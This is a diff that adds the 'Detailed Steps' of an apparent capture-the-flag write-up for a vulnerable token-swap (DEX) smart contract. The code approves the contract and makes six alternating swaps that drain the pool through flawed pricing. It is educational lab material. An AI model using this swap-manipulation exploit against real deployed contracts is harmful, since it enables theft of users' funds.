@@ -30,3 +30,14 @@
 
 ## Detailed Steps
 
+```js
+await contract.approve(contract.address, 300); // approve the contract to spend our token1 and token2.
+token1 = await contract.token1(); // get token1's contract address
+token2 = await contract.token2(); // get token2's contract address
+await contract.swap(token1, token2, 10); // swap 1
+await contract.swap(token2, token1, 20); // swap 2
+await contract.swap(token1, token2, 24); // swap 3
+await contract.swap(token2, token1, 30); // swap 4
+await contract.swap(token1, token2, 41); // swap 5
+await contract.swap(token2, token1, 45); // swap 6. Note that we can't swap with all our token2 balance since there are only 45 token2 in the pool at this time.
+```
